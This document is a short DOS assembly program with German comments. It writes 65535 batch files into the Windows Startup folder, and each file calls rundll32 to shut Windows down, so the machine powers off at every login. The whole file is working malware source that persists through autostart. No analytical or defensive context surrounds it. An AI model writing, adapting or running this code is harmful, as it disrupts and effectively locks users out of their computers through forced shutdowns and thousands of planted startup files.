;erstellt ffffh .bat-dateien im autostart-ordner, die den pc runterfahren.

.model tiny
.code
xor cx,cx
mov [offset zlr],cx
los:
mov bx,offset tab

mov al,ch
and al,0f0
shr al,4
xlat
mov [offset dat+42],al

mov al,ch
and al,0f
xlat
mov [offset dat+43],al

mov al,cl
and al,0f0
shr al,4
xlat
mov [offset dat+44],al

mov al,cl
and al,0f
xlat
mov [offset dat+45],al


;datei öffnen
mov ax,03c00
xor cx,cx
mov dx,offset dat
int 021
;datei schreiben
mov bx,ax	;handle
mov ax,04000
mov cx,55	;dateilänge!!!!!!!!!!!!!
mov dx,offset txt
int 021
;datei schliessen
mov ax,03e00
int 021

mov cx,[offset zlr]
inc cx
mov [offset zlr],cx
cmp cx,0ffff
jne los

mov ax,4c00h
int 21h

.data
tab:	db "0123456789ABCDEF"
dat:	db "C:\WINDOWS\STARTM~1\PROGRA~1\AUTOST~1\nett0000.bat",0
txt:	db "echo off",13,10,"cls",13,10,"C:\WINDOWS\rundll32.exe USER,EXITWINDOWS"
zlr:	dw 0

end